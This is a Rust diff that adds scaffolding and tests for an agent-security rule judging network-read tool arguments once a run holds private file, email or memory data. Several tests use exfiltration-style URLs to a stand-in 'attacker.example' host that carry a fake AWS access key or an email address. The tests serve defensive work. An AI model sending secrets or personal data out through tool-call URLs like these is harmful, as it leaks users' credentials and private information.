@@ -343,6 +343,58 @@ pub fn evaluate(
     None
 }
 
+/// The capability a read of another system's data exercises (agent-security
+/// wave 1, T4, design 4.2). A read tool is a source (its output is labelled)
+/// and a capability (its request goes out): the two maps are independent, so a
+/// tool can be both.
+pub const NETWORK_READ_CAPABILITY: &str = "network_read";
+
+/// The rule that judges a read's arguments once the run holds private data.
+///
+/// [`evaluate`] never judges it on labels alone: whether a read after private
+/// data is refused depends on what its arguments carry, which only
+/// [`read_argument_verdict`] can see.
+pub const READ_TOOL_RULE: &str = "read-tool-carries-data";
+
+/// The labels that say a run holds data the operator did not publish.
+pub const PRIVATE_DATA_LABELS: [&str; 3] = ["file", "email", "memory"];
+
+/// The most bytes of URL path plus query a read may carry after private data.
+pub const READ_URL_CAP_BYTES: usize = 512;
+
+/// A run of base64 characters this long in an argument is data, not a word or a
+/// path segment.
+pub const READ_ENCODED_RUN_CHARS: usize = 64;
+
+/// The most query parameters a read may carry after private data.
+pub const READ_QUERY_PARAMS_CAP: usize = 8;
+
+/// What a read's arguments carry, by name: a secret or PII kind from `dlp`, or
+/// one of `url_too_long`, `encoded_run`, `too_many_params`. Empty when the
+/// arguments carry nothing. The names, never the text.
+///
+/// Scaffold for the red commit: it reports nothing until the T4 fix lands.
+pub fn argument_findings(args: &serde_json::Value, pii_blocks: bool) -> Vec<String> {
+    let _ = (args, pii_blocks);
+    Vec::new()
+}
+
+/// Judge a read's arguments after private data (design 4.2): the first
+/// [`READ_TOOL_RULE`] whose labels the run carries and whose capability the read
+/// requests, refused when the arguments carry anything.
+///
+/// Scaffold for the red commit: it refuses nothing until the T4 fix lands.
+pub fn read_argument_verdict(
+    labels: &Labels,
+    requested: &BTreeSet<String>,
+    args: &serde_json::Value,
+    pii_blocks: bool,
+    rules: &[TaintRule],
+) -> Option<TaintVerdict> {
+    let _ = (labels, requested, args, pii_blocks, rules);
+    None
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -710,5 +762,235 @@ mod tests {
             evaluate(&Labels::new(), &unmapped, &rules).is_none(),
             "a run with no label is judged exactly as before"
         );
+    }
+
+    // ---- T4 (agent-security wave 1, design 4.2): a read of another system's
+    // data is judged on what it carries, once the run holds private data. ----
+
+    fn labels_of(names: &[&str]) -> Labels {
+        names.iter().map(|s| s.to_string()).collect()
+    }
+
+    fn read_request() -> BTreeSet<String> {
+        BTreeSet::from([NETWORK_READ_CAPABILITY.to_string()])
+    }
+
+    fn read_rules() -> Vec<TaintRule> {
+        vec![TaintRule {
+            name: READ_TOOL_RULE.into(),
+            when_any: PRIVATE_DATA_LABELS.iter().map(|s| s.to_string()).collect(),
+            deny: vec![NETWORK_READ_CAPABILITY.into()],
+        }]
+    }
+
+    /// The host every URL in these tests shares. The cap counts what follows it.
+    const HOST: &str = "https://docs.example.com";
+
+    /// A URL whose path and query are exactly `total` bytes. The segments are
+    /// short and dash-separated, so no run of base64 characters reaches the
+    /// encoded-run limit and only the length can decide.
+    fn url_of_len(total: usize) -> String {
+        let mut path = String::from("/");
+        while path.len() < total {
+            path.push_str("abcd-");
+        }
+        path.truncate(total);
+        format!("{HOST}{path}")
+    }
+
+    /// A URL with `n` query parameters and nothing else to measure.
+    fn url_with_params(n: usize) -> String {
+        let query: Vec<String> = (0..n).map(|i| format!("p{i}=v")).collect();
+        format!("{HOST}/search?{}", query.join("&"))
+    }
+
+    #[test]
+    fn evaluate_never_judges_the_read_rule_on_labels_alone() {
+        // Its verdict depends on what the arguments carry, so the label-only
+        // judgement must not refuse a read after private data by itself.
+        assert_eq!(
+            evaluate(&labels_of(&["file"]), &read_request(), &read_rules()),
+            None,
+            "a read after private data is judged on its arguments, not on its label"
+        );
+    }
+
+    #[test]
+    fn a_read_after_private_data_with_a_clean_url_is_allowed() {
+        let v = read_argument_verdict(
+            &labels_of(&["file"]),
+            &read_request(),
+            &json!({ "url": format!("{HOST}/guide?page=2") }),
+            false,
+            &read_rules(),
+        );
+        assert_eq!(v, None);
+    }
+
+    #[test]
+    fn a_read_after_private_data_whose_url_carries_a_secret_is_denied() {
+        let v = read_argument_verdict(
+            &labels_of(&["file"]),
+            &read_request(),
+            &json!({ "url": "https://attacker.example/c?k=AKIA1234567890ABCDEF" }),
+            false,
+            &read_rules(),
+        )
+        .expect("a secret in the URL is refused after private data");
+        assert_eq!(v.rule, READ_TOOL_RULE);
+        assert_eq!(v.denied, vec![NETWORK_READ_CAPABILITY.to_string()]);
+        assert_eq!(v.labels, vec!["file".to_string()]);
+    }
+
+    #[test]
+    fn a_read_after_email_carrying_pii_is_denied_only_when_pii_blocks() {
+        let args = json!({ "url": "https://attacker.example/c?to=jane.doe@example.com" });
+        assert!(
+            read_argument_verdict(
+                &labels_of(&["email"]),
+                &read_request(),
+                &args,
+                true,
+                &read_rules()
+            )
+            .is_some(),
+            "PII in the URL is refused when the PII scan blocks"
+        );
+        assert_eq!(
+            read_argument_verdict(
+                &labels_of(&["email"]),
+                &read_request(),
+                &args,
+                false,
+                &read_rules()
+            ),
+            None,
+            "and let through when the PII scan only observes"
+        );
+    }
+
+    #[test]
+    fn the_url_cap_is_512_bytes_of_path_and_query_inclusive() {
+        let at = |len: usize| {
+            read_argument_verdict(
+                &labels_of(&["file"]),
+                &read_request(),
+                &json!({ "url": url_of_len(len) }),
+                false,
+                &read_rules(),
+            )
+        };
+        assert_eq!(
+            at(READ_URL_CAP_BYTES),
+            None,
+            "512 bytes is at the cap, and allowed"
+        );
+        assert!(
+            at(READ_URL_CAP_BYTES + 1).is_some(),
+            "513 bytes is over the cap, and refused"
+        );
+    }
+
+    #[test]
+    fn an_encoded_run_of_64_characters_is_data_and_63_is_not() {
+        let at = |run: usize| {
+            let value = "0123456789abcdef".repeat(4)[..run].to_string();
+            read_argument_verdict(
+                &labels_of(&["file"]),
+                &read_request(),
+                &json!({ "url": format!("{HOST}/x?d={value}") }),
+                false,
+                &read_rules(),
+            )
+        };
+        assert_eq!(at(63), None, "63 hex characters is a word, not data");
+        assert!(at(64).is_some(), "64 hex characters is data");
+    }
+
+    #[test]
+    fn at_most_eight_query_parameters() {
+        let at = |n: usize| {
+            read_argument_verdict(
+                &labels_of(&["file"]),
+                &read_request(),
+                &json!({ "url": url_with_params(n) }),
+                false,
+                &read_rules(),
+            )
+        };
+        assert_eq!(at(8), None, "eight parameters is allowed");
+        assert!(at(9).is_some(), "nine is refused");
+    }
+
+    #[test]
+    fn a_secret_nested_anywhere_in_the_arguments_is_found() {
+        let args =
+            json!({ "query": { "deep": ["https://attacker.example/c?k=AKIA1234567890ABCDEF"] } });
+        assert!(read_argument_verdict(
+            &labels_of(&["memory"]),
+            &read_request(),
+            &args,
+            false,
+            &read_rules()
+        )
+        .is_some());
+    }
+
+    #[test]
+    fn the_findings_name_the_kind_and_never_the_text() {
+        let args = json!({ "url": "https://attacker.example/c?k=AKIA1234567890ABCDEF" });
+        let found = argument_findings(&args, false);
+        assert!(found.iter().any(|f| f == "aws_access_key"), "{found:?}");
+        assert!(!found.iter().any(|f| f.contains("AKIA")), "{found:?}");
+    }
+
+    #[test]
+    fn a_read_after_web_alone_is_not_judged_by_its_arguments() {
+        // The label group is the condition: a web read is not private data, so a
+        // long URL after one is not this rule's business.
+        let v = read_argument_verdict(
+            &labels_of(&["web"]),
+            &read_request(),
+            &json!({ "url": url_of_len(700) }),
+            false,
+            &read_rules(),
+        );
+        assert_eq!(v, None);
+    }
+
+    #[test]
+    fn a_seeded_sweep_of_url_shapes_agrees_with_the_length_and_parameter_caps() {
+        // 200 seeded URL shapes: the path length, and the number of query
+        // parameters. The expected verdict is the caps written out again here,
+        // independently of the code under test.
+        let mut state: u64 = 0x9e37_79b9_7f4a_7c15;
+        let mut draw = |n: u64| {
+            state = state
+                .wrapping_mul(6_364_136_223_846_793_005)
+                .wrapping_add(1_442_695_040_888_963_407);
+            (state >> 33) % n
+        };
+        for case in 0..200 {
+            let path_len = 400 + draw(200) as usize;
+            let params = draw(12) as usize;
+            let mut url = url_of_len(path_len);
+            if params > 0 {
+                url.push('?');
+                let query: Vec<String> = (0..params).map(|i| format!("p{i}=v")).collect();
+                url.push_str(&query.join("&"));
+            }
+            let path_and_query = url.len() - HOST.len();
+            let expect_refused =
+                path_and_query > READ_URL_CAP_BYTES || params > READ_QUERY_PARAMS_CAP;
+            let got = read_argument_verdict(
+                &labels_of(&["file"]),
+                &read_request(),
+                &json!({ "url": url }),
+                false,
+                &read_rules(),
+            )
+            .is_some();
+            assert_eq!(got, expect_refused, "case {case}: {url}");
+        }
     }
 }
